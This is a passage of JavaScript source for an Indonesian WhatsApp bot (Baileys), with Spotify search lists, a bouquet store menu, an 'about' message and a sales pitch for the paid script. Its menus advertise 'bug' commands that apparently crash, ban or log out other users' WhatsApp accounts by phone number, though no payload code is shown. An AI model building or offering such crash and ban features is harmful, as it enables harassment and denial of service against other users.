title: ` ${search.all[5].title}`,
description: `${search.all[5].title}`, 
id: `.play ${search.all[5].title}`
},
{
title: ` ${search.all[6].title}`,
description: `${search.all[6].title}`, 
id: `.play ${search.all[6].title}`
},
{
title: ` ${search.all[7].title}`,
description: `${search.all[7].title}`, 
id: `.play ${search.all[7].title}`
},
{
title: ` ${search.all[8].title}`,
description: `${search.all[8].title}`, 
id: `.play ${search.all[8].title}`
},
{
title: ` ${search.all[9].title}`,
description: `${search.all[9].title}`, 
id: `.play ${search.all[9].title}`
},
{
title: ` ${search.all[10].title}`,
description: `${search.all[10].title}`, 
id: `.play ${search.all[10].title}`
}
]}]

let listMessage = {
    title: 'Hasil Search 🧐',
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
interactiveMessage: proto.Message.InteractiveMessage.create({
video: fs.readFileSync('./gunung.mp4'),
caption: ' ',
gifPlayback: true,
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By AnakNusantara', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kalz.decodeJid(kalz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: wek
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('© *XII BDPM 2*')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `👋 Hai kak${m.sender.split('@')[0]}`,
 subtitle: "XII BDPM2",
 hasMediaAttachment: true,...(await prepareWAMessageMedia( { image: { url: res12?.thumbnail }}, { upload: kalz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case "sposearch":{
await loading()
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`)
wek = `
Berikut adalah hasil pencarian dari Bot
`
let sections = [{
title: 'List Hasil Pencarian',
highlight_label: '© Spotify',
rows: [
{
title: `${api.data[0].title}`,
description: `${api.data[0].title}`, 
id: `.spotify ${api.data[0].title}`
}, 
{
title: ` ${api.data[2].title}`,
description: `${api.data[2].title}`, 
id: `.spotify ${api.data[2].title}`
},
{
title: ` ${api.data[3].title}`,
description: `${api.data[3].title}`, 
id: `.spotify ${api.data[3].title}`
},
{
title: ` ${api.data[4].title}`,
description: `${api.data[4].title}`, 
id: `.spotify ${api.data[4].title}`
},
{
title: ` ${api.data[5].title}`,
description: `${api.data[5].title}`, 
id: `.spotify ${api.data[5].title}`
},
{
title: ` ${api.data[6].title}`,
description: `${api.data[6].title}`, 
id: `.spotify ${api.data[6].title}`
},
{
title: ` ${api.data[7].title}`,
description: `${api.data[7].title}`, 
id: `.spotify ${api.data[7].title}`
},
{
title: ` ${api.data[8].title}`,
description: `${api.data[8].title}`, 
id: `.spotify ${api.data[8].title}`
},
{
title: ` ${api.data[9].title}`,
description: `${api.data[9].title}`, 
id: `.spotify ${api.data[9].title}`
},
{
title: ` ${api.data[10].title}`,
description: `${api.data[10].title}`, 
id: `.spotify ${api.data[10].title}`
}
]}]

let listMessage = {
    title: 'Hasil Search 🧐',
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
interactiveMessage: proto.Message.InteractiveMessage.create({
video: fs.readFileSync('./gunung.mp4'),
caption: ' ',
gifplayback: true,
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By AnakNusantara', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kalz.decodeJid(kalz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: wek
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: '*© X-Code -V 3.0*'
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `👋 Hai kak${m.sender.split('@')[0]}`,
 subtitle: "*© X-Code -V 3.0*",
 hasMediaAttachment: true,...(await prepareWAMessageMedia( { image: { url: "https://telegra.ph/file/f993a3d183150aa3984f1.jpg" }}, { upload: kalz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break


case "start": case "list":{
await loading() 
wek = `
XII Bdpm2 Merupakan tempat jualan berbagai barang barang remaja yang kekinian
*Kenapa Pakai Bot WhatsApp?*
Seiring berkembangnya zaman teknologi yang canggih tentunya kami tidak ingin ketinggalan zaman maka dari itu kami memakai bot WhatsApp ini untuk mempermudah akses penjualan
*XII Bdpm2 Jualan apa?*
Kami menjual beberapa produk² yang di Minati remaja masa kini yaitu bouqetbunga,barang² branded dan masi banyak lainnya, untuk melihat list produk lebih lengkap silakan *Klik Button Di Bawah Ini*
`
let sections = [{
title: 'List Produk 🛍️',
highlight_label: '© XII Bdpm2',
rows: [
{
title: 'Bouqet Viral 🌷',
description: `Display Produk Bouqet`, 
id: '.storebouqet'
}, 
{
title: 'Sepatu Keren 🔥',
description: `Displays Sepatu keren`, 
id: '.sepatu'
}
]}]

let listMessage = {
    title: 'List Produk',
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
interactiveMessage: proto.Message.InteractiveMessage.create({
video: fs.readFileSync('./gunung.mp4'),
caption: ' ',
gifPlayback: true,
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By AnakNusantara', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kalz.decodeJid(kalz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: wek
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('© *X-Code -V 3.0*')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `👋 Hai kak${m.sender.split('@')[0]}`,
 subtitle: "*X-Code -V 3.0*",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: bd2
 } }, { upload: kalz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'sepatu':{
kalzx('Belum Ada listnya Silakan Di Tunggu')
}
break
case "menu": {
await loading() 
wek = `
> Hai @${pushname} saya adalah chat bot yang di mix dengan kecerdasan buatan (Archtificial Intelegent) yang siap membantu anda dalam hal yang saya bisa

╭─ 「 *𓆩BOT-INFO𓆪* 」──
┆ ◈  *Nama Bot* : ${global.botname}
┆ ◈  *Nama Owner* : ${ownername}
┆ ◈  *Runtime* : ${runtime(process.uptime())}
┆ ◈  *Total fitur* : ${totalFitur()}
┆ ◈  *Library* : @whiskeysockets
┆ ◈  *Database* : MongoDb
╰─────────────────
╭─ •  「 *𓆩USER-INFO𓆪* 」── ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
┆ ◈  *Nama User* : ${pushname}
┆ ◈  *Nunber User* : ${m.sender.split('@')[0]}
┆ ◈  *Status* : ${isCreator? 'Owner✅' : 'User 🌷'} ${kalz.premium ? 'Premium' : 'Free '}
╰─────────────────

> Tolong Gunakan Bot Ini Dengan Bijak 😉
`
let sections = [{
title: 'List Menu',
highlight_label: '© X-code',
rows: [
{
title: 'Bouqet Store\n[ *STORE BOUQET* ]',
description: 'Displays Bouqet Store',
id: '.storebouqet'
},
{
title: 'Allmenu\n[ *SEMUA MENU* ]',
description: `Display AllMenu`, 
id: '.allmenu'
}, 
{
title: 'Menu Panel\n[ PANEL MENU* ]',
description: `Displays Panel Menu`, 
id: '.panelmenu'
},
{
title: 'Menu Download\n[ *DOWNLOAD MENU* ]',
description: `Displays Download Menu`, 
id: '.downloadmenu'
},
{
title: 'Menu Group\n[ *GROUP MENU* ]',
description: `Displays Group Menu`, 
id: '.groupmenu'
},
{
title: 'Menu Store[ *STORE MENU* ]',
description: `Displays Store Menu`, 
id: '.storemenu'
},
{
title: 'Menu Other\n[ *OTHER MENU* ]', 
description: "Displays the Other Menu", 
id: '.othermenu'
}]}, 
{
title: 'Bug Menu ❗',
highlight_label: '© X-code', 
rows: [
{
title: 'Bug Number\n[ *NUMBER BUG* ]',
description: "Display Bug Number",
id: '.bugnumber'
},
{
title: 'Bug Verify\n[ *VERIFY BUG* ]',
description: "Display Bug Verfify",
id: '.bugverify'
}, 
{
title: 'Bug Crash\n[ *CRASH BUG* ]', 
description: "Display Bug Crash", 
id: '.bugcrash'
}
]}, 
{
title: 'Khusu Owner ❗',
highlight_label: '© X-code', 
rows: [
{
title: 'addpremium\n[ *COMMAND ADD* ]', 
description: "Display Add Premium User", 
id: '.addprem'
},
{
title: 'admin\n[ *ADMIN INTEGRASI* ]', 
description: 'Display Add Admin Panel', 
id: '.admin'
}]},
{
title: 'Contributor Bot\n[ *BOT SUPPORTED* ]', 
highlight_label: 'Terimakasih ✨', 
rows: [
{
title: 'Terimkakasih.. 🙏', 
description: 'Thank You For..\n[ *TERIMAKASIH* ]', 
id: '.tqto'
}, 
{
title: 'Owner Kalzx 😈', 
descriotion: 'Kalzx Nih 😈', 
id: '.owner'
}
]}]

let listMessage = {
    title: 'List Menu',
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
interactiveMessage: proto.Message.InteractiveMessage.create({
video: fs.readFileSync('./gunung.mp4'),
caption: ' ',
gifPlayback: true,
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By WhastApp', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kalz.decodeJid(kalz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: wek
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('© 𝗫-𝗰𝗼𝗱𝗲𝗿 𝗧𝗲𝗮𝗺 𝟮𝟬𝟮𝟰')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "X-CODE",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/36760b5abbc5d2cb5434e.png" 
 } }, { upload: kalz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
},
{
"name" : "quick_reply",
"buttonParamsJson" :  `{\"display_text\":\"About Me 📝\",\"id\":\".about\"}`
},
{
"name" : "quick_reply",
"buttonParamsJson" :  `{\"display_text\":\"Script 📼\",\"id\":\".sc\"}`
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'about': {
await loading()
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© X-Code 2024"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Hai kak ${pushname} ${stime}\n*X-Code* Adalah robot balas otomatis pintar yang di ciptakan oleh ${ownername}.Dengan bahasa program javascript bot ini sedang dalam tahap perkembangan belum sepenuhnya sempurna karena untuk menjadi sempurna itu butuh proses :).Silakan gunakan bot ini dengan bijak dan jangan di salah gunakan\n\n#KaryaAnakBangsa`),
                    subtitle: "X-CODE",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: thumb }}, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Owner\",\"id\":\".owner\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'script': case 'sc':{
replay(`Haii kak ${pushname} 😉\n${stime}\nSilakan Tunggu....`)
const txt = `
*SCRIPT INI BERBAYAR*
• Harga : 10K
• Benefit :
> Free Update sampai -v 5.0
> Free Panel 3 GB
> No Encrypt
• Features : 
> Create panel
> Admin Panel ( BUTTON ) 
> Play ( BUTTON ) 
> spotify
> stiker
> Bug
> Pinterest ( Button Slide )
> Payment ( Button Slide ) 
> Store Menu
> Button List
> Button Gift
> Bcgc
> Pushkontak
> Save Contact
> Upsw
> Download tiktok
> Tiktok search
> Tiktok Play
> Download instagram
> ytmp3
> ytmp4
> toimage
> tovid
> Ai
> Simi
> sound 1-161

*MINAT? KILK LINK DI BAWAH*
https://wa.me/6289528157038


_© 𝗫-𝗰𝗼𝗱𝗲𝗿 𝗧𝗲𝗮𝗺 𝟮𝟬𝟮𝟰_
`
     
kalz.sendMessage(m.chat, {
video: fs.readFileSync('./xcode.mp4'),
caption: txt,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: "HaikalAja",
newsletterJid: "120363182916458068@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: `${stime} ${pushname}`,
body: '',
thumbnailUrl: ppnyauser, 
sourceUrl: `https://wa.me/6289528157038`, 
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
}
break

case 'allmenu':{
replay(`Haii kak ${pushname} 😉\n${stime}\nSilakan Tunggu....`)
const menu = `
⫷ *A L L  M E N U* ⫸

*PANEL MENU*
${tanda} ${prefix}panel
${tanda} ${prefix}addusr
${tanda} ${prefix}addsrv
${tanda} ${prefix}admin
${tanda} ${prefix}delusr
${tanda} ${prefix}delsrv
${tanda} ${prefix}detusr
${tanda} ${prefix}listadmin
${tanda} ${prefix}listusr
${tanda} ${prefix}listsrv
${tanda} ${prefix}reinstall
${tanda} ${prefix}restartsrv
${tanda} ${prefix}ramlist
${tanda} ${prefix}spanel
${tanda} ${prefix}startsrv
${tanda} ${prefix}stopsrv
${tanda} ${prefix}suspend
${tanda} ${prefix}tutorial
${tanda} ${prefix}unsuspend 
${tanda} ${prefix}updatesrv
${tanda} ${prefix}webpanel

*ISLAMIC MENU*
${tanda} ${prefix}asmaulhusna
${tanda} ${prefix}alquranaudio
${tanda} ${prefix}kisahnabi

*OTHER MENU*
${tanda} ${prefix}cekkhodam
${tanda} ${prefix}ai
${tanda} ${prefix}zeta
${tanda} ${prefix}simi
${tanda} ${prefix}addcase
${tanda} ${prefix}delcase
${tanda} ${prefix}listcase
${tanda} ${prefix}getcase 
${tanda} ${prefix}totalfitur
${tanda} ${prefix}public
${tanda} ${prefix}self
${tanda} ${prefix}restart
${tanda} ${prefix}runtime
${tanda} ${prefix}addprem
${tanda} ${prefix}delprem
${tanda} ${prefix}listprem
${tanda} ${prefix}upsw
${tanda} ${prefix}getsw
${tanda} ${prefix}listsw
${tanda} ${prefix}bcgc
${tanda} ${prefix}bcimg
${tanda} ${prefix}sticker
${tanda} ${prefix}payment
${tanda} ${prefix}qc
${tanda} ${prefix}hdr
${tanda} ${prefix}autoread
${tanda} ${prefix}autobio
${tanda} ${prefix}pushkontak2
${tanda} ${prefix}listgc
${tanda} ${prefix}tourl
${tanda} ${prefix}toimg
${tanda} ${prefix}tovideo
${tanda} ${prefix}emojimix
${tanda} ${prefix}emojimix2

*WALPAPER MENU*
${tanda} ${prefix}walpaperislami
${tanda} ${prefix}walpapermodern
${tanda} ${prefix}walpapersenja
${tanda} ${prefix}walpaperkpop

*IMAFE SEARCH*
${tanda} ${prefix}idolaku
${tanda} ${prefix}wali
${tanda} ${prefix}aesthetic 
${tanda} ${prefix}gunung
${tanda} ${prefix}cecan
${tanda} ${prefix}cogan

*ANIME IMAGE SEARCH*
${tanda} ${prefix}anime nakano
${tanda} ${prefix}anime neko
${tanda} ${prefix}anime Naruto
${tanda} ${prefix}anime boruto
${tanda} ${prefix}anime gojo
${tanda} ${prefix}anime michael
${tanda} ${prefix}anime morishima 
${tanda} ${prefix}anime shikimori
${tanda} ${prefix}anime kaoru
${tanda} ${prefix}anime nakano
${tanda} ${prefix}anime kimie
${tanda} ${prefix}anime kagura
${tanda} ${prefix}anime doraemon
${tanda} ${prefix}anime genshin

*EPHOTO MENU*
${tanda} ${prefix}glitchtext
${tanda} ${prefix}writetext
${tanda} ${prefix}advancedglow
${tanda} ${prefix}typographytext
${tanda} ${prefix}pixelglitch
${tanda} ${prefix}neonglitch
${tanda} ${prefix}flagtext
${tanda} ${prefix}flag3dtext
${tanda} ${prefix}deletingtext
${tanda} ${prefix}blackpinkstyle
${tanda} ${prefix}glowingtext
${tanda} ${prefix}underwatertext
${tanda} ${prefix}logomaker
${tanda} ${prefix}cartoonstyle
${tanda} ${prefix}papercutstyle
${tanda} ${prefix}watercolortext
${tanda} ${prefix}effectclouds
${tanda} ${prefix}blackpinklogo
${tanda} ${prefix}gradienttext
${tanda} ${prefix}summerbeach
${tanda} ${prefix}luxurygold
${tanda} ${prefix}multicoloredneon
${tanda} ${prefix}sandsummer
${tanda} ${prefix}galaxywallpaper
${tanda} ${prefix}1917style
${tanda} ${prefix}makingneon
${tanda} ${prefix}royaltext
${tanda} ${prefix}freecreate
${tanda} ${prefix}galaxystyle
${tanda} ${prefix}lighteffects

*DOWNLOAD MENU*
${tanda} ${prefix}sposearch <query>
${tanda} ${prefix}yts <query>
${tanda} ${prefix}ytmp3 <link>
${tanda} ${prefix}ytmp4 <link>
${tanda} ${prefix}tt <link>
${tanda} ${prefix}instagram <link>
${tanda} ${prefix}play <query>
${tanda} ${prefix}spotify <query>
${tanda} ${prefix}tktk <query>

*GROUP MENU*
${tanda} ${prefix}totag
${tanda} ${prefix}hidetag
${tanda} ${prefix}tagall
${tanda} ${prefix}linkgc
${tanda} ${prefix}resetlinkgc
${tanda} ${prefix}sendlinkgc
${tanda} ${prefix}promote
${tanda} ${prefix}demote
${tanda} ${prefix}kick
${tanda} ${prefix}add
${tanda} ${prefix}pushkontak
${tanda} ${prefix}cekidgc
${tanda} ${prefix}getidgc
${tanda} ${prefix}join

*STORE MENU*
${tanda} ${prefix}batal
${tanda} ${prefix}done
${tanda} ${prefix}listpanel
${tanda} ${prefix}proses
${tanda} ${prefix}reqpanel
${tanda} ${prefix}sewa
${tanda} ${prefix}sewabot
${tanda} ${prefix}spanel
${tanda} ${prefix}tunda

*BUG NUMBER*
${tanda} ${prefix}🔥 62898xxxxx
${tanda} ${prefix}☕ 62898xxxxx
${tanda} ${prefix}🌷 62898xxxxx

*BUG VERIFY*
${tanda} ${prefix}verify 62898xxxx
${tanda} ${prefix}banned 62898xxxx
${tanda} ${prefix}basmi 62898xxxx
${tanda} ${prefix}logout 62898xxxx
${tanda} ${prefix}kenon 62898xxxx

*BUG CRASH*
${tanda} ${prefix}zero-bug
${tanda} ${prefix}xcrash
${tanda} ${prefix}xioscrash2
${tanda} ${prefix}xcrash
${tanda} ${prefix}xcrash2
${tanda} ${prefix}delaybug
${tanda} ${prefix}pmbug
${tanda} ${prefix}amountbug
${tanda} ${prefix}bugkrek
${tanda} ${prefix}bugpepek
${tanda} ${prefix}bugtes
${tanda} ${prefix}bugtes2
${tanda} ${prefix}null-chace
${tanda} ${prefix}prikitiw
${tanda} ${prefix}bijiloe

_© 𝗫-𝗰𝗼𝗱𝗲𝗿 𝗧𝗲𝗮𝗺 𝟮𝟬𝟮𝟰_
`
     
kalz.sendMessage(m.chat, {
video: fs.readFileSync('./gunung.mp4'),
caption: menu,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: "HaikalAja",
newsletterJid: "120363182916458068@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: `${stime} ${pushname}`,
body: '',
thumbnailUrl: thumb, 
sourceUrl: grup, 
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
}
break

case "storebouqet": {
await loading() 
wek = `
Berikut adalah list produk bouqet kalz store, ada banyak macam pilihan bouqet yang kekinian dan sangat cocok untuk wisuda, untuk pasangan, untuk ulang tahun dll...

silakan pilih bouqet yang anda inginkan ☺️
`
let sections = [{
title: 'List Menu',
highlight_label: '© Kalz Store',
rows: [
{
title: 'bouqet Boneka + snack 🛍️',
description: `Display bouqet snack`, 
id: '.bonekasnack'
}, 
{
title: 'bouqet bunga edelweis 💮',
description: `Displays bunga edelweis`, 
id: '.edelweis'
},
{
